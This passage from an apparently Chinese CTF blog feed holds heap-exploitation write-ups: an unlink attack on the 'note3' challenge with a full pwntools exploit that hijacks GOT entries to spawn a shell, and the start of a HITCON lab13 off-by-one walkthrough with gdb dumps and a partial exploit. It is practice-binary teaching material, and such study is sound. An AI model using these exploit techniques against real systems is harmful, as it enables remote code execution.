[rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a2-1跟我前面做过的一两道题都类似，利用0-1负数，然后转成无符号比较，变成很大，也就是堆溢出</p><p><strong>注意：这里的坑点就是a3, a3假设被定为\n，我们sendline的时候sendline(p64(addr))会覆盖到下一个地址的最后一位，并将他改成\x00，这是最坑的点了，我被这个坑了好久</strong></p><h3 id="漏洞利用过程-3"><a href="#漏洞利用过程-3" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>准备工作</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br></pre></td></tr></table></figure><p>不用多说吧，每道堆题一样的套路</p><ol start="2"><li>unlink部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决</strong></p><p>简单的unlink</p><ol start="3"><li>这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line"><span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"><span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]) <span class="comment">#关键点，切记，不能破坏到下一个地址，不然会出错</span></span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br></pre></td></tr></table></figure><ol start="4"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note3'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note3'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">    ptr = <span class="number">0x6020c8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line">    <span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br><span class="line">    edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>unlink部分完结了</li><li>unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点</li><li>要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨</li><li>我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上</li><li>感谢萝卜师傅的指导</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcwMDcuaHRt" title="https://bbs.pediy.com/thread-247007.htm">看雪大佬<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/6a76efc5/">https://noone-hub.github.io/posts/6a76efc5/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程3</title>
    <url>/posts/f4127a66/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程3"><a href="#pwn堆入门系列教程3" class="headerlink" title="pwn堆入门系列教程3"></a>pwn堆入门系列教程3</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn入门系列教程2<i class="fa fa-external-link"></i></span></p><p>序言：这次终于过了off-by-one来到了Chunk Extend / Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="1-1-HITCON-Trainging-lab13"><a href="#1-1-HITCON-Trainging-lab13" class="headerlink" title="1.1. HITCON Trainging lab13"></a>1.1. HITCON Trainging lab13</h2><p>这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好</p><h3 id="1-1-1-功能分析"><a href="#1-1-1-功能分析" class="headerlink" title="1.1.1. 功能分析"></a>1.1.1. 功能分析</h3><p>引用于ctf-wiki</p><ol><li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li><li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</li><li>展示堆，输出指定索引堆的大小以及内容。</li><li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li></ol><h3 id="1-1-2-漏洞点分析"><a href="#1-1-2-漏洞点分析" class="headerlink" title="1.1.2. 漏洞点分析"></a>1.1.2. 漏洞点分析</h3><p>漏洞点存在off-by-one,通过off-by-one进行overlapping就成了</p><h3 id="1-1-3-漏洞利用过程"><a href="#1-1-3-漏洞利用过程" class="headerlink" title="1.1.3. 漏洞利用过程"></a>1.1.3. 漏洞利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1775030-0x30</span><br><span class="line">0x1775000:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775010:	0x0000000000000018	0x0000000001775030</span><br><span class="line">0x1775020:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块1 chunk</span></span><br><span class="line">0x1775030:	0x0000000a31313131	0x0000000000000000</span><br><span class="line">0x1775040:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775050:	0x0000000000000010	0x0000000001775070</span><br><span class="line">0x1775060:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块2 chunk</span></span><br><span class="line">0x1775070:	0x0000000a32323232	0x0000000000000000</span><br><span class="line">0x1775080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0x1775090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>攻击过程：</p><ol><li>创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size</li><li>编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x8a5030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0x8a5000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x00000000008a5030</span></span><br><span class="line"><span class="number">0x8a5020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span> #/bin/sh为后面做准备</span><br><span class="line"><span class="number">0x8a5040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta"># off-by-one</span></span><br><span class="line"><span class="number">0x8a5050</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x00000000008a5070</span></span><br><span class="line"><span class="number">0x8a5060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5070</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0x8a5090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li><li>free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0xf89030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0xf89000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x0000000000f89030</span></span><br><span class="line"><span class="number">0xf89020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0xf89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta">#free 0x40大小</span></span><br><span class="line"><span class="number">0xf89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000f89070</span></span><br><span class="line"><span class="number">0xf89060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> <span class="meta">#free 0x21大小</span></span><br><span class="line"><span class="number">0xf89070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0xf89090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li><li>这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了</li></ol><h3 id="1-1-4-exp"><a href="#1-1-4-exp" class="headerlink" title="1.1.4. exp"></a>1.1.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'heapcreator'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'heapcreator'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line">heap = elf</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    create(<span class="number">0x18</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    